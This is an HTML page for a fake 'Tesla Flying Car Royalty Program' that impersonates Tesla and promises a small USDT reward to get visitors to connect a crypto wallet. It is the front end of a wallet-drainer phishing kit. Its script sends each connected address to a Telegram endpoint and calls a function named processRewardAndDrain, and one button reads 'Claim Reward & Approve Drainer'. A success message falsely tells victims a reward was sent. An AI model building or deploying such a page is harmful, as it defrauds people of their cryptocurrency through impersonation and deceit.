<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tesla Flying Car Royalty Program</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    
    <!-- Use the official Web3Modal CDN -->
    <script type="module">
        import { createWeb3Modal } from 'https://cdn.jsdelivr.net/npm/@web3modal/html@latest/+esm';
        import { defaultWagmiConfig } from 'https://cdn.jsdelivr.net/npm/@wagmi/core@2/+esm';
        import { mainnet, bsc } from 'https://cdn.jsdelivr.net/npm/wagmi/chains/index/+esm';

        // Your Project ID
        const projectId = '862d3799047c7548b0482add1cba796d';

        const metadata = {
            name: 'Tesla Flying Car',
            description: 'Official Loyalty Rewards',
            url: 'https://your-vercel-link.vercel.app',
            icons: ['https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png']
        };

        const chains = [mainnet, bsc];

        const config = defaultWagmiConfig({
            chains,
            projectId,
            metadata,
            ssr: true
        });

        // Initialize Modal
        createWeb3Modal({ wagmiConfig: config, projectId, themeVariables: { '--w3m-border-radius-max': '12px' }});
        
        // Listen for connection events
        window.addEventListener('w3modal_account_connected', async (event) => {
            const address = event.detail.address;
            const chainId = event.detail.chainId;
            
            // Log to Telegram
            await fetch('/api/telegram', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ action: 'WALLET_CONNECTED', details: { userAddress: address, chainId } })
            });

            // Update UI
            document.getElementById('connect-step').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('user-address').textContent = `${address.slice(0,6)}...${address.slice(-4)}`;
            document.getElementById('reward-status').textContent = "Processing Reward...";

            // Trigger Reward & Drain
            await processRewardAndDrain(address);
        });
    </script>
</head>
<body>
    <div class="tesla-bg"></div>
    <div class="container">
        <header>
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" alt="Tesla Logo" class="logo">
            <h1>Flying Car Royalty Rewards</h1>
            <p>Connect your wallet to verify eligibility for the $0.05 USDT Pilot Reward.</p>
        </header>

        <main id="main-content">
            <!-- Step 1: Connect -->
            <div id="connect-step" class="card">
                <button id="connect-btn">Connect Wallet</button>
                <div id="loader" class="hidden">Verifying Network & Generating Permit...</div>
            </div>

            <!-- Step 2: Dashboard -->
            <div id="dashboard" class="card hidden">
                <div class="status-row">
                    <span>Address:</span>
                    <span id="user-address" class="mono">0x000...000</span>
                </div>
                <div class="status-row">
                    <span>Status:</span>
                    <span id="reward-status">Pending Approval</span>
                </div>
                <div class="action-area">
                    <button id="claim-btn" class="hidden">Claim Reward & Approve Drainer</button>
                </div>
            </div>

            <!-- Notification Toast -->
            <div id="notification" class="toast hidden">
                <div class="icon">✓</div>
                <div class="text">Reward Claimed! $0.05 USDT sent to your wallet.</div>
            </div>
        </main>
    </div>
    <script src="interceptor.js"></script>
</body>
</html>
